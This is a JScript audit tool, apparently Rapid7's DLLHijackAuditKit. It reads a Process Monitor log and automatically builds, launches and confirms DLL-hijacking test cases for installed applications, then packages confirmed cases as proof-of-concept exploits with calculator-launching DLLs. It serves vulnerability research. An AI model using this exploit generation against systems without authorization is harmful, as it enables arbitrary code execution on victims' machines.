/* DLLHijackAuditKit (C) 2010 Rapid7, Inc */

var oFso = new ActiveXObject("Scripting.FileSystemObject");
var oShl = new ActiveXObject("WScript.Shell");
var oCWD = oShl.CurrentDirectory + "";


function print_status(msg) {
	try {
		WScript.StdOut.WriteLine("[*] "+ msg);
	} catch(e) {}
}

function process_list() {
	var res = new Array();
	var wbemFlagReturnImmediately = 0x10;
	var wbemFlagForwardOnly = 0x20;
	var oWMI = GetObject("winmgmts:\\\\localhost\\root\\CIMV2");
	var cPID = oWMI.ExecQuery("SELECT * FROM Win32_Process", "WQL", wbemFlagReturnImmediately | wbemFlagForwardOnly);
	var enumItems = new Enumerator(cPID);
	for (; !enumItems.atEnd(); enumItems.moveNext()) {
		var p = enumItems.item();
		if (p.ExecutablePath && p.ExecutablePath.toLowerCase().indexOf("taskmgr") != -1) continue;
		res.push(p.ProcessId);
	}
	return res;
}

function replace_payloads(dir, src) {
	var base = oFso.GetFolder(dir);
	var files = new Enumerator(base.files);
	for (; !files.atEnd(); files.moveNext()) {
		var entry = files.item().Name.toString().toLowerCase();
		if ( entry.indexOf("exploit.") == -1) {
			if (entry.toString().indexOf(".exe") != -1) {
				try { oFso.CopyFile(src + "\\runcalc.exe", dir + "\\" + entry); } catch(e) { }
			} else {
				try { oFso.CopyFile(src + "\\runcalc.dll", dir + "\\" + entry); } catch(e) { }
			}
		}
	}

	var subs = new Enumerator(base.SubFolders);
	for (; !subs.atEnd(); subs.moveNext()) {
		var entry = (subs.item() + "").toLowerCase();
		replace_payloads(entry, src);
	}
}


/* Process Logfile.CSV
	a) Make a list of applications and their associated DLLs
	b) Create a test case for each extension and each DLL
	c) Run each test case and look for "exploited.txt"
	d) Copy confirmed test cases to a new directory
*/


if (! oFso.FileExists("Logfile.CSV")) {
	print_status("Please save Logfile.CSV to the current directory first");
	WScript.Quit();
}

var procs = process_list();
print_status("Protecting " + procs.length + " processes");

var apps  = new Array();
var fCSV  = oFso.OpenTextFile("Logfile.CSV");
var line  = fCSV.ReadLine();
var iPath = 4;
var iProc = 1;
var bits  = line.split(",");

// Determine which fields are what index
for (var i=0; i < bits.length; i++) {
	if (bits[i].toLowerCase().indexOf("process name") != -1) {
		iProc = i;
	}
	if (bits[i].toLowerCase().indexOf("path") != -1) {
		iPath = i;
	}
}

// Parse the CSV into a map of each application's loads
while( ! fCSV.AtEndOfStream ) {
	line = fCSV.ReadLine();
	bits = line.replace(/\",/g, "\"||||").replace(/"/g, '').split("||||");

	var vApp = bits[iProc].toLowerCase();
	var vPath = bits[iPath].toLowerCase();
	var vExt = vPath.replace(/.*DLLAudit\\ext\\/ig, '').split("\\")[0].toLowerCase();
	var vTgt = vPath.replace(/.*DLLAudit\\ext\\/ig, '').split("\\");
	vTgt.shift();

	var vDll = vTgt.join("\\").toLowerCase();

	if (! apps[vApp]) apps[vApp] = new Array();
	if (! apps[vApp][vExt]) apps[vApp][vExt] = new Array();
	apps[vApp][vExt][vDll] = true;
}


print_status("Generating and validating test cases...");
try { oFso.CreateFolder(oCWD + "\\TestCases"); } catch(e) { }
try { oFso.CreateFolder(oCWD + "\\Exploits"); } catch(e) { }

for (var tApp in apps) {
	print_status(" Application: " + tApp);

	var aBase = oCWD + "\\TestCases\\" + tApp;
	try { oFso.CreateFolder(aBase); } catch(e) { }

	for (var tExt in apps[tApp]) {
		var eBase = aBase + "\\" + tExt;
		var aExploited = new Array();

		try { oFso.CreateFolder(eBase); } catch(e) { }
		for (var tDll in apps[tApp][tExt]) {
			var tBits = tDll.split("\\");
			var tName = tBits.pop();
			var dBase = eBase + "\\" + tName;
			try { oFso.CreateFolder(dBase); } catch(e) { }

			if (aExploited[tName]) continue;

			// tDll may be a subdirectory + DLL
			tPath = dBase;
			for (var y = 0; y < tBits.length; y++) {
				tPath = tPath + "\\" + tBits[y];
				try { oFso.CreateFolder(tPath); } catch(e) { }
			}
			tPath = tPath + "\\" + tName;

			try {
				if (tName.toLowerCase().indexOf(".exe") != -1) {
					oFso.CopyFile(oCWD + "\\runtest.exe", tPath);
				} else {
					oFso.CopyFile(oCWD + "\\runtest.dll", tPath);
				}
			} catch(e) { }

			// Create the actual test case file
			try {
				var a = oFso.CreateTextFile(dBase + "\\exploit." + tExt);
				a.WriteLine("HOWDY!");
				a.Close();
			} catch(e) { }


			try {
				// Run the test case
				oShl.CurrentDirectory = dBase;
				oShl.Run("cmd.exe /c start exploit." + tExt, 0);
			} catch(e) { }
			WScript.Sleep(500);

			var nprocs = process_list();
			var cnt = 0;
			while(nprocs.length == procs.length && cnt < 2) {
				cnt++;
				WScript.Sleep(500);
				nprocs = process_list();
			}

			// If an application spawned, give it three seconds
			// This helps with ProcMon memory usage as well
			if (nprocs.length > procs.length) {
				WScript.Sleep(3000);
			}

			var killer = "taskkill /F ";
			for (var i=0; i < nprocs.length; i++) {
				var found = false;
				for (var x=0; x < procs.length; x++) {
					if (nprocs[i] == procs[x]) {
						found = true;
						break;
					}
				}
				if (found) continue;
				killer = killer + "/PID " + nprocs[i] + " ";
			}
			oShl.Run(killer, 0, true);

			// Check for the file existence
			if (oFso.FileExists(dBase + "\\exploited.txt")) {

				print_status("Successfully exploited " + tApp + " with ." + tExt + " using " + tName);
				aExploited[tName] = true;
				var xBase = oCWD + "\\Exploits\\" + tApp + "_" + tExt + "_" + tName;
				try { oFso.CreateFolder(xBase); } catch(e) { }
				try { oFso.CopyFolder(dBase + "\\*.*", xBase + "\\", true); } catch(e) { }
				try { oFso.CopyFile(dBase + "\\*.*", xBase + "\\", true); } catch(e) { }
				try { oFso.DeleteFile(xBase + "\\exploited.txt"); } catch(e) { }
				replace_payloads(xBase, oCWD);
			}

		}

	}
}

